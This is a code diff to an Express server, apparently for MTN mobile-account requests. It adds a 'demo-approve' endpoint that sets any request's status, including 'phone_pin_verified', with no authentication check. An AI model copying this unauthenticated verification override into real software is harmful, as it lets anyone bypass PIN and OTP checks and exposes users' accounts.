@@ -332,11 +332,27 @@ app.post('/api/mtn/submit-link', (req, res) => {
     if (existing) {
       existing.link = link;
       existing.phone = resolvedPhone;
-      existing.status = 'otp_pending';
+      existing.status = 'pending';
     }
   }
 
   res.json(jsonSuccess({ message: 'Link submitted', phone: resolvedPhone, link }));
+});
+
+app.post('/api/mtn/demo-approve', (req, res) => {
+  const { requestId, status } = req.body || {};
+  if (!requestId) {
+    return res.status(400).json(jsonError('Missing requestId'));
+  }
+
+  const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
+  if (!existing) {
+    return res.status(404).json(jsonError('Request not found'));
+  }
+
+  const nextStatus = status || (existing.step === 'otp' ? 'otp_pending' : 'phone_pin_verified');
+  existing.status = nextStatus;
+  res.json(jsonSuccess({ message: 'Demo approval applied', status: nextStatus, requestId }));
 });
 
 app.get('/api/check-status', (req, res) => {
